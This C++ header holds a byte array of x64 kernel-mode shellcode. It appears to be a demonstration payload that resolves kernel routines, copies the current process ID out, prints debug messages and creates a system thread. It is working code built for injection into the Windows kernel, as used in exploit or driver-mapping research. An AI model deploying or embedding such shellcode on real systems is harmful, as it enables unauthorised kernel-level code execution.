#pragma once
#include <stdint.h>

namespace kernel_mode_shellcode_resource
{
	static const uint8_t kernel_mode_shellcode[] = {
			0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x81, 0xEC, 0xD8, 0x01, 0x00, 0x00,
	0x48, 0x83, 0xBC, 0x24, 0xE0, 0x01, 0x00, 0x00, 0x00, 0x75, 0x05, 0xE9,
	0xA9, 0x07, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xE0, 0x01, 0x00, 0x00,
	0x48, 0x89, 0x84, 0x24, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24,
	0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20,
	0x48, 0x83, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x05, 0xE9, 0x7C, 0x07, 0x00,
	0x00, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x80, 0x00,
	0x00, 0x00, 0xB8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x82,
	0x00, 0x00, 0x00, 0xB8, 0x47, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0x84, 0x00, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0x86, 0x00, 0x00, 0x00, 0xB8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0xB8, 0x43, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0x8A, 0x00, 0x00, 0x00, 0xB8, 0x75, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0xB8, 0x72, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0x8E, 0x00, 0x00, 0x00, 0xB8, 0x72, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0xB8, 0x65,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x92, 0x00, 0x00, 0x00, 0xB8,
	0x6E, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x94, 0x00, 0x00, 0x00,
	0xB8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x96, 0x00, 0x00,
	0x00, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x98, 0x00,
	0x00, 0x00, 0xB8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x9A,
	0x00, 0x00, 0x00, 0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0x9C, 0x00, 0x00, 0x00, 0xB8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0x9E, 0x00, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0xB8, 0x73, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0xA2, 0x00, 0x00, 0x00, 0xB8, 0x73, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0xA4, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x66, 0x89,
	0x84, 0x24, 0xA6, 0x00, 0x00, 0x00, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x44, 0x24, 0x60, 0xB8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44,
	0x24, 0x62, 0xB8, 0x47, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x64,
	0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x66, 0xB8, 0x74,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x68, 0xB8, 0x50, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x44, 0x24, 0x6A, 0xB8, 0x72, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x44, 0x24, 0x6C, 0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44,
	0x24, 0x6E, 0xB8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x70,
	0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x72, 0xB8, 0x73,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x74, 0xB8, 0x73, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x44, 0x24, 0x76, 0xB8, 0x49, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x44, 0x24, 0x78, 0xB8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44,
	0x24, 0x7A, 0x33, 0xC0, 0x66, 0x89, 0x44, 0x24, 0x7C, 0xB8, 0x52, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x40, 0xB8, 0x74, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x44, 0x24, 0x42, 0xB8, 0x6C, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x44, 0x24, 0x44, 0xB8, 0x43, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24,
	0x46, 0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x48, 0xB8,
	0x70, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x4A, 0xB8, 0x79, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x4C, 0xB8, 0x4D, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x44, 0x24, 0x4E, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x44, 0x24, 0x50, 0xB8, 0x6D, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24,
	0x52, 0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x54, 0xB8,
	0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x56, 0xB8, 0x79, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x58, 0x33, 0xC0, 0x66, 0x89, 0x44,
	0x24, 0x5A, 0xB8, 0x44, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x28,
	0xB8, 0x62, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x2A, 0xB8, 0x67,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x2C, 0xB8, 0x50, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x44, 0x24, 0x2E, 0xB8, 0x72, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x44, 0x24, 0x30, 0xB8, 0x69, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44,
	0x24, 0x32, 0xB8, 0x6E, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x34,
	0xB8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x36, 0x33, 0xC0,
	0x66, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x48, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0x02, 0x01, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0x04, 0x01, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0x06, 0x01, 0x00, 0x00, 0xB8, 0x6F, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0xB8, 0x20,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x0A, 0x01, 0x00, 0x00, 0xB8,
	0x66, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x0C, 0x01, 0x00, 0x00,
	0xB8, 0x72, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x0E, 0x01, 0x00,
	0x00, 0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x10, 0x01,
	0x00, 0x00, 0xB8, 0x6D, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x12,
	0x01, 0x00, 0x00, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0x14, 0x01, 0x00, 0x00, 0xB8, 0x4B, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0x16, 0x01, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0xB8, 0x72, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0x1A, 0x01, 0x00, 0x00, 0xB8, 0x6E, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0x1C, 0x01, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0x1E, 0x01, 0x00, 0x00, 0xB8, 0x6C, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x20, 0x01, 0x00, 0x00, 0xB8, 0x20,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x22, 0x01, 0x00, 0x00, 0xB8,
	0x6D, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x24, 0x01, 0x00, 0x00,
	0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x26, 0x01, 0x00,
	0x00, 0xB8, 0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x28, 0x01,
	0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x2A,
	0x01, 0x00, 0x00, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0x2C, 0x01, 0x00, 0x00, 0xB8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0x2E, 0x01, 0x00, 0x00, 0xB8, 0x68, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0x32, 0x01, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0x34, 0x01, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0x36, 0x01, 0x00, 0x00, 0xB8, 0x63, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x38, 0x01, 0x00, 0x00, 0xB8, 0x6F,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x3A, 0x01, 0x00, 0x00, 0xB8,
	0x64, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x3C, 0x01, 0x00, 0x00,
	0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x3E, 0x01, 0x00,
	0x00, 0xB8, 0x21, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x40, 0x01,
	0x00, 0x00, 0x33, 0xC0, 0x66, 0x89, 0x84, 0x24, 0x42, 0x01, 0x00, 0x00,
	0xB8, 0x53, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xB0, 0x00, 0x00,
	0x00, 0xB8, 0x68, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xB2, 0x00,
	0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xB4,
	0x00, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0xB6, 0x00, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0xB8, 0x00, 0x00, 0x00, 0xB8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0xBA, 0x00, 0x00, 0x00, 0xB8, 0x6F, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0xBC, 0x00, 0x00, 0x00, 0xB8, 0x64, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0xBE, 0x00, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xB8, 0x20, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xC2, 0x00, 0x00, 0x00, 0xB8, 0x73,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xC4, 0x00, 0x00, 0x00, 0xB8,
	0x75, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xC6, 0x00, 0x00, 0x00,
	0xB8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xC8, 0x00, 0x00,
	0x00, 0xB8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xCA, 0x00,
	0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xCC,
	0x00, 0x00, 0x00, 0xB8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0xCE, 0x00, 0x00, 0x00, 0xB8, 0x73, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0xD0, 0x00, 0x00, 0x00, 0xB8, 0x66, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0xD2, 0x00, 0x00, 0x00, 0xB8, 0x75, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0xD4, 0x00, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0xD6, 0x00, 0x00, 0x00, 0xB8, 0x6C, 0x00, 0x00,
	0x00, 0x66, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0xB8, 0x79, 0x00,
	0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xDA, 0x00, 0x00, 0x00, 0xB8, 0x20,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xDC, 0x00, 0x00, 0x00, 0xB8,
	0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xDE, 0x00, 0x00, 0x00,
	0xB8, 0x78, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xE0, 0x00, 0x00,
	0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xE2, 0x00,
	0x00, 0x00, 0xB8, 0x63, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xE4,
	0x00, 0x00, 0x00, 0xB8, 0x75, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0xE6, 0x00, 0x00, 0x00, 0xB8, 0x74, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0xE8, 0x00, 0x00, 0x00, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x84, 0x24, 0xEA, 0x00, 0x00, 0x00, 0xB8, 0x64, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0xEC, 0x00, 0x00, 0x00, 0xB8, 0x21, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0xEE, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x66, 0x89,
	0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0x88, 0x01, 0x00, 0x00, 0xB8, 0x28, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0x8A, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24,
	0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x90, 0x01, 0x00, 0x00,
	0xB8, 0x1C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x98, 0x01, 0x00,
	0x00, 0xB8, 0x1E, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x9A, 0x01,
	0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x60, 0x48, 0x89, 0x84, 0x24, 0xA0,
	0x01, 0x00, 0x00, 0xB8, 0x1A, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24,
	0xA8, 0x01, 0x00, 0x00, 0xB8, 0x1C, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84,
	0x24, 0xAA, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x48, 0x89,
	0x84, 0x24, 0xB0, 0x01, 0x00, 0x00, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x66,
	0x89, 0x84, 0x24, 0xB8, 0x01, 0x00, 0x00, 0xB8, 0x12, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x84, 0x24, 0xBA, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24,
	0x28, 0x48, 0x89, 0x84, 0x24, 0xC0, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x8C,
	0x24, 0x88, 0x01, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x20, 0x48, 0x89, 0x84,
	0x24, 0x60, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x98, 0x01, 0x00,
	0x00, 0xFF, 0x54, 0x24, 0x20, 0x48, 0x89, 0x84, 0x24, 0x70, 0x01, 0x00,
	0x00, 0x48, 0x8D, 0x8C, 0x24, 0xA8, 0x01, 0x00, 0x00, 0xFF, 0x54, 0x24,
	0x20, 0x48, 0x89, 0x84, 0x24, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x8C,
	0x24, 0xB8, 0x01, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x20, 0x48, 0x89, 0x84,
	0x24, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x5C, 0x09, 0x00, 0x00,
	0xFF, 0x94, 0x24, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x00,
	0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x5E, 0x09, 0x00, 0x00, 0xFF, 0x94,
	0x24, 0x58, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x60, 0x01, 0x00,
	0x00, 0x00, 0x74, 0x16, 0x48, 0x83, 0xBC, 0x24, 0x70, 0x01, 0x00, 0x00,
	0x00, 0x74, 0x0B, 0x48, 0x83, 0xBC, 0x24, 0x80, 0x01, 0x00, 0x00, 0x00,
	0x75, 0x02, 0xEB, 0x71, 0xFF, 0x94, 0x24, 0x60, 0x01, 0x00, 0x00, 0x48,
	0x89, 0x84, 0x24, 0x68, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x68,
	0x01, 0x00, 0x00, 0x00, 0x75, 0x02, 0xEB, 0x55, 0x48, 0x8B, 0x8C, 0x24,
	0x68, 0x01, 0x00, 0x00, 0xFF, 0x94, 0x24, 0x70, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0xC8, 0xE8, 0xB9, 0x01, 0x00, 0x00, 0x89, 0x84, 0x24, 0x50, 0x01,
	0x00, 0x00, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24,
	0x50, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x78, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x48, 0x08, 0xFF, 0x94, 0x24, 0x80, 0x01, 0x00, 0x00, 0x48,
	0x8D, 0x94, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xCE, 0x08,
	0x00, 0x00, 0xFF, 0x94, 0x24, 0x58, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4,
	0xD8, 0x01, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x81,
	0xEC, 0x88, 0x00, 0x00, 0x00, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x66, 0x89,
	0x44, 0x24, 0x40, 0x0F, 0xB7, 0x44, 0x24, 0x40, 0x41, 0xB8, 0x63, 0x69,
	0x70, 0x6B, 0x8B, 0xD0, 0x33, 0xC9, 0xFF, 0x15, 0x00, 0x08, 0x00, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x00, 0x75,
	0x16, 0x48, 0x8D, 0x0D, 0x6C, 0x08, 0x00, 0x00, 0xE8, 0x21, 0x01, 0x00,
	0x00, 0xB8, 0x9A, 0x00, 0x00, 0xC0, 0xE9, 0xFE, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x05, 0xF6, 0x07, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48,
	0x8B, 0x44, 0x24, 0x48, 0x48, 0x89, 0x44, 0x24, 0x68, 0x0F, 0xB7, 0x44,
	0x24, 0x40, 0x66, 0x89, 0x44, 0x24, 0x70, 0x48, 0x8D, 0x44, 0x24, 0x60,
	0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x05, 0x9C, 0xF7, 0xFF, 0xFF,
	0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xBA, 0xFF, 0xFF, 0x1F,
	0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x98, 0x07, 0x00, 0x00,
	0x89, 0x44, 0x24, 0x44, 0x83, 0x7C, 0x24, 0x44, 0x00, 0x7D, 0x0C, 0x0F,
	0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x44, 0xE9, 0x92, 0x00, 0x00, 0x00, 0x48,
	0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24,
	0x58, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0,
	0xBA, 0xFF, 0xFF, 0x1F, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xFF, 0x15,
	0x60, 0x07, 0x00, 0x00, 0x89, 0x44, 0x24, 0x44, 0x83, 0x7C, 0x24, 0x44,
	0x00, 0x7D, 0x09, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x44, 0xEB, 0x55,
	0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9,
	0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xFF, 0x15,
	0x10, 0x07, 0x00, 0x00, 0x89, 0x44, 0x24, 0x44, 0x83, 0x7C, 0x24, 0x44,
	0x00, 0x7D, 0x09, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x44, 0xEB, 0x25,
	0x48, 0x8B, 0x44, 0x24, 0x48, 0x8B, 0x10, 0x48, 0x8D, 0x0D, 0xB6, 0x07,
	0x00, 0x00, 0xE8, 0x2B, 0x00, 0x00, 0x00, 0xBA, 0x63, 0x69, 0x70, 0x6B,
	0x48, 0x8B, 0x4C, 0x24, 0x48, 0xFF, 0x15, 0xE9, 0x06, 0x00, 0x00, 0x33,
	0xC0, 0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x8B, 0x44, 0x24,
	0x08, 0xC3, 0xFF, 0x25, 0xB0, 0x06, 0x00, 0x00, 0xC2, 0x00, 0x00, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0x25, 0xB2, 0x06
	};
}